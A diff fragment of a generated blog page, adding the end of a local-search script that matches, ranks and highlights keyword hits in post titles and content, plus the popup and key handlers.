+                  if (indexOfTitle.length > 0 || indexOfContent.length > 0) {
+                    isMatch = true;
+                    hitCount = indexOfTitle.length + indexOfContent.length;
+                  }
+                }
+
+                // show search results
+
+                if (isMatch) {
+                  // sort index by position of keyword
+
+                  [indexOfTitle, indexOfContent].forEach(function (index) {
+                    index.sort(function (itemLeft, itemRight) {
+                      if (itemRight.position !== itemLeft.position) {
+                        return itemRight.position - itemLeft.position;
+                      } else {
+                        return itemLeft.word.length - itemRight.word.length;
+                      }
+                    });
+                  });
+
+                  // merge hits into slices
+
+                  function mergeIntoSlice(text, start, end, index) {
+                    var item = index[index.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    var hits = [];
+                    var searchTextCountInSlice = 0;
+                    while (position + word.length <= end && index.length != 0) {
+                      if (word === searchText) {
+                        searchTextCountInSlice++;
+                      }
+                      hits.push({position: position, length: word.length});
+                      var wordEnd = position + word.length;
+
+                      // move to next position of hit
+
+                      index.pop();
+                      while (index.length != 0) {
+                        item = index[index.length - 1];
+                        position = item.position;
+                        word = item.word;
+                        if (wordEnd > position) {
+                          index.pop();
+                        } else {
+                          break;
+                        }
+                      }
+                    }
+                    searchTextCount += searchTextCountInSlice;
+                    return {
+                      hits: hits,
+                      start: start,
+                      end: end,
+                      searchTextCount: searchTextCountInSlice
+                    };
+                  }
+
+                  var slicesOfTitle = [];
+                  if (indexOfTitle.length != 0) {
+                    slicesOfTitle.push(mergeIntoSlice(title, 0, title.length, indexOfTitle));
+                  }
+
+                  var slicesOfContent = [];
+                  while (indexOfContent.length != 0) {
+                    var item = indexOfContent[indexOfContent.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    // cut out 100 characters
+                    var start = position - 20;
+                    var end = position + 80;
+                    if(start < 0){
+                      start = 0;
+                    }
+                    if (end < position + word.length) {
+                      end = position + word.length;
+                    }
+                    if(end > content.length){
+                      end = content.length;
+                    }
+                    slicesOfContent.push(mergeIntoSlice(content, start, end, indexOfContent));
+                  }
+
+                  // sort slices in content by search text's count and hits' count
+
+                  slicesOfContent.sort(function (sliceLeft, sliceRight) {
+                    if (sliceLeft.searchTextCount !== sliceRight.searchTextCount) {
+                      return sliceRight.searchTextCount - sliceLeft.searchTextCount;
+                    } else if (sliceLeft.hits.length !== sliceRight.hits.length) {
+                      return sliceRight.hits.length - sliceLeft.hits.length;
+                    } else {
+                      return sliceLeft.start - sliceRight.start;
+                    }
+                  });
+
+                  // select top N slices in content
+
+                  var upperBound = parseInt('1');
+                  if (upperBound >= 0) {
+                    slicesOfContent = slicesOfContent.slice(0, upperBound);
+                  }
+
+                  // highlight title and content
+
+                  function highlightKeyword(text, slice) {
+                    var result = '';
+                    var prevEnd = slice.start;
+                    slice.hits.forEach(function (hit) {
+                      result += text.substring(prevEnd, hit.position);
+                      var end = hit.position + hit.length;
+                      result += '<b class="search-keyword">' + text.substring(hit.position, end) + '</b>';
+                      prevEnd = end;
+                    });
+                    result += text.substring(prevEnd, slice.end);
+                    return result;
+                  }
+
+                  var resultItem = '';
+
+                  if (slicesOfTitle.length != 0) {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + highlightKeyword(title, slicesOfTitle[0]) + "</a>";
+                  } else {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + title + "</a>";
+                  }
+
+                  slicesOfContent.forEach(function (slice) {
+                    resultItem += "<a href='" + articleUrl + "'>" +
+                      "<p class=\"search-result\">" + highlightKeyword(content, slice) +
+                      "...</p>" + "</a>";
+                  });
+
+                  resultItem += "</li>";
+                  resultItems.push({
+                    item: resultItem,
+                    searchTextCount: searchTextCount,
+                    hitCount: hitCount,
+                    id: resultItems.length
+                  });
+                }
+              })
+            };
+            if (keywords.length === 1 && keywords[0] === "") {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-search fa-5x" /></div>'
+            } else if (resultItems.length === 0) {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-frown-o fa-5x" /></div>'
+            } else {
+              resultItems.sort(function (resultLeft, resultRight) {
+                if (resultLeft.searchTextCount !== resultRight.searchTextCount) {
+                  return resultRight.searchTextCount - resultLeft.searchTextCount;
+                } else if (resultLeft.hitCount !== resultRight.hitCount) {
+                  return resultRight.hitCount - resultLeft.hitCount;
+                } else {
+                  return resultRight.id - resultLeft.id;
+                }
+              });
+              var searchResultList = '<ul class=\"search-result-list\">';
+              resultItems.forEach(function (result) {
+                searchResultList += result.item;
+              })
+              searchResultList += "</ul>";
+              resultContent.innerHTML = searchResultList;
+            }
+          }
+
+          if ('auto' === 'auto') {
+            input.addEventListener('input', inputEventFunction);
+          } else {
+            $('.search-icon').click(inputEventFunction);
+            input.addEventListener('keypress', function (event) {
+              if (event.keyCode === 13) {
+                inputEventFunction();
+              }
+            });
+          }
+
+          // remove loading animation
+          $(".local-search-pop-overlay").remove();
+          $('body').css('overflow', '');
+
+          proceedsearch();
+        }
+      });
+    }
+
+    // handle and trigger popup window;
+    $('.popup-trigger').click(function(e) {
+      e.stopPropagation();
+      if (isfetched === false) {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+      } else {
+        proceedsearch();
+      };
+    });
+
+    $('.popup-btn-close').click(onPopupClose);
+    $('.popup').click(function(e){
+      e.stopPropagation();
+    });
+    $(document).on('keyup', function (event) {
+      var shouldDismissSearchPopup = event.which === 27 &&
+        $('.search-popup').is(':visible');
+      if (shouldDismissSearchPopup) {
+        onPopupClose();
+      }
+    });
+  </script>
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+<script type="text/javascript" src="/js/src/baidu.js"></script>
+</html>
